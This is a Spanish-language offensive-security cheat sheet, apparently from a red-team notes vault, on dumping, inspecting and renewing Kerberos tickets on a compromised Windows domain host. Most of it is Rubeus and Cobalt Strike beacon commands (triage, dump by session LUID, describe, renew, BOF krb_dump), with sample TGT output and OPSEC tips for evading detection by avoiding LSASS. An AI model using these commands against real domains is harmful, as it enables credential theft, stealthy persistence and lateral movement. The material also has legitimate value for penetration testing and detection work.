---
tags: [ad, kerberos, rubeus, tickets, credential-access]
status: done
platform: windows
---

# Kerberos Tickets — Extracción y Reutilización

> Extraer tickets Kerberos de la caché de un sistema comprometido para reutilizarlos.

---

## Listar tickets activos

```
beacon> execute-assembly Rubeus.exe triage
```

Muestra todos los tickets Kerberos activos en el sistema. Los tickets con `krbtgt` como servicio son **TGTs**; el resto son **TGS**.

---

## Extraer tickets

```
# Por LUID de sesión + servicio específico
beacon> execute-assembly Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```

> [!NOTE] OPSEC
> Esta técnica no toca el proceso LSASS al contrario que dumpear hashes — es más sigilosa.

---

## Ver validez de un ticket

```
Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
```

```
ServiceName  :  krbtgt/CONTOSO.COM
UserName     :  rsteel
StartTime    :  11/04/2025 16:33:17
EndTime      :  12/04/2025 02:33:17
RenewTill    :  18/04/2025 16:33:17
Flags        :  name_canonicalize, pre_authent, initial, renewable, forwardable
```

---

## Renovar TGTs

```
beacon> execute-assembly Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
```

> [!IMPORTANT]
> Se puede renovar cada ~10 horas hasta que se alcanza `RenewTill`. Pasada esa fecha, hay que dumpear un TGT fresco.

---

## Via BOFs (sin execute-assembly, más sigiloso)

```
beacon> krb_triage
beacon> krb_dump /user:rsteel /service:krbtgt
```

---

## Ver también

- [[Pass The Ticket]] — inyectar tickets en contexto actual
- [[OS Credential Dumping]] — dump de hashes NTLM / credenciales
